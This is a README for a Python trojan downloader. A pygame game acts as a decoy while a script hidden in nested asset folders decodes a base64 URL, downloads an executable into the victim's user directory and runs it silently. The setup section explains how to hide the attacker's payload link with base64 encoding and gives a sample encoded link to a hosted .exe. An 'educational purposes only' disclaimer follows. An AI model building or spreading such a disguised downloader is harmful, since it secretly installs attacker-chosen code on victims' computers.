# TrojanDownloader
**A Python game which silently downloads and executes a file when started**

## How it works
First the victim has to install the requirements listed in ```requirements.txt``` these include ```pygame``` and ```requests```.
Pygame will be used for the game which acts as a decoy and requirements will be used to downlaod the file the attacker wants the victim to download onto the pc.

Next the victim will execute the game by running ```python3 main.py```
The program will then get the CWD (current working directory) and navigate into ```/assets/soundssfx/grenades/bullets/dep/```  and run ```assets.py```

That python file will have a base64 encoded link stored in a variable called ```asset```, it will decode this string and send a get request to it using the requests module.
It will download the file into the user directory of the victim and save it as ```online_rocket_game_node.exe``` (if you download anything else than an .exe you have to change the extension to whatever filetype you're downloading) and try running it using ```subprocess.run```



## Installation

To get the Trojan up and running you have to first adjust some lines of code:
1. Get the download link of your file and convert it to base64 usind an online encoder like this one: https://www.base64encode.org/
2. Copy the base64 string and paste it into the asset variable in ```/assets/soundssfx/grenades/bullets/dep/assets.py``` (make sure to add ```==``` at the end of the string if not already present as buffer)
3. It should then look like this: ```asset = 'aHR0cHM6Ly9jZG4uZ2xpdGNoLmdsb2JhbC8zOTc1NGVjOC1iMzQ0LTQ2NmYtYjJhMS1jYmRkYjVkMTY0ZTcvbm9zdGVhbHRoLmV4ZT92PTE2OTc1Njc3NDk4MzQ=='```
   
### Disclaimer

**The TrojanDownloader project is for educational purposes only. The creator of the project is not responsible for any explicit or illegal acts performed with the program. Use this script responsibly and at your own risk.**

